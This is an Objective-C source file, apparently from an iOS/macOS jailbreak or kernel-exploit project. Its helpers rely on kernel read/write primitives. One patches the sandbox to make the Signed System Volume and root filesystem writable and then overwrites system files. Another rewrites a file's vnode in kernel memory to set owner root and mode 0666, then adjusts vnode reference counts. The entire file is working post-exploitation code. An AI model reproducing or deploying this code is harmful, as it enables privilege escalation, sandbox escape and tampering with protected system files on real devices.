// SSVUtils.m
#import "SSVUtils.h"
#import "kexploit/krw.h"
#import "kexploit/vnode.h"
#import "kexploit/kutils.h"
#import "kexploit/sandbox.h"
#import "kexploit/file.h"        // contiene overwrite_system_file e patch_sandbox_ext

bool ssv_write(const char *path, const void *data, size_t len) {
    if (!data || len == 0) return false;

    char tmp[PATH_MAX];
    snprintf(tmp, sizeof(tmp), "/tmp/ssv_%d", getpid());
    int fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return false;
    write(fd, data, len);
    close(fd);

    patch_sandbox_ext();                    // ← SSV + rootfs r/w
    int ret = overwrite_system_file((char*)path, tmp);

    unlink(tmp);
    return ret == 0;
}

bool ssv_chown_root(const char *path) {
    uint64_t vnode = get_vnode_for_path_by_open(path);
    if (vnode == -1) return false;

    uint64_t v_data = kread64(vnode + off_vnode_v_data);
    if (!v_data) return false;

    kwrite32(v_data + 0x80, 0);   // uid = 0 (root)
    kwrite32(v_data + 0x84, 0);   // gid = 0
    kwrite16(v_data + 0x88, 0666); // rw-rw-rw-

    // refresh vnode
    uint32_t usec = kread32(vnode + off_vnode_v_usecount);
    uint32_t ioc  = kread32(vnode + off_vnode_v_iocount);
    kwrite32(vnode + off_vnode_v_usecount, usec + 1);
    kwrite32(vnode + off_vnode_v_iocount,  ioc  + 1);
    kwrite32(vnode + off_vnode_v_usecount, usec);
    kwrite32(vnode + off_vnode_v_iocount,  ioc);

    return true;
}

void ssv_dump_fsnode(const char *path) {
    research_vnode_apfs_fsnode(path);
}
